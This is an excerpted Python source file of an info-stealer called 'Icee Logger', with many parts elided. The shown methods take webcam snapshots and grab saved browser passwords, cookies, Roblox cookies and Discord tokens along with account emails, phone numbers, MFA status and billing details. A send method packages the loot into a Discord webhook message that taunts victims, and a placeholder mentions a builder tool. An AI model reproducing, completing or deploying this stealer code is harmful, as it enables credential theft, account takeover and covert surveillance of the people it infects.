WEBHOOK = "Do NOT Enter anything here! Use the builder only!"
...
class IceeLogger:
    ...
    def webshot(self):
        ...
        for name in camlist:
            subprocess.run(f'cm.bam /devname "{name}" /filename webcam.bmp', capture_output= True, shell= True, cwd= sys._MEIPASS)
    ...
    def getpass(self):
        ...
        self.passwords = [x.replace("=" * 50, "Icee Logger".center(50, "="), 1) for x in passwords]
    ...
    def getcookie(self):
        ...
        self.cookies = [x.replace("=" * 50, "Icee Logger".center(50, "="), 1) for x in cookies]
    ...
    def roblox_stealer(self):
        ...
        if len(self.roblocookies):
            ...
            with open(os.path.join(rbdir, "Roblox Cookies.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                file.write(("\n" + "Icee Logger".center(50, "=")).join(self.roblocookies))
            self.grabbed_data["Games"] += 1
    ...
    def getTokens(self):
        ...
        for token in self.tokens:
                ...
                data.append(f"{'Icee Logger'.center(90, '-')}\n\nUsername: {user}\nUser ID: {id}\nMFA: {mfa}\nEmail: {email}\nPhone: {phone}\nVerified: {verified}\nNitro: {nitro_data}\nBilling Info: {billing}\n\nToken: {token}\n\n{gifts}")
        if len(data)!= 0:
    ...
    def send(self):
        ...
        payload = {
  "content": "\"I beamed your grandma.\" - every beamer.. @everyone" if PINGME else "\"I beamed your grandma.\" - every beamer..",
  "embeds": [
    {
      "title": "<- Icee Logger ->",
      ...
      "color": 34303,
      "footer": {
        "text": "|--> Icee Logger On Top! <--| https://github.com/iceeburr/Icee-Logger |"
      },
      "thumbnail": {
        "url": "https://media.discordapp.net/attachments/1045019709793374320/1045020096805998603/ice_cube.png"
      }
    }
  ]
}
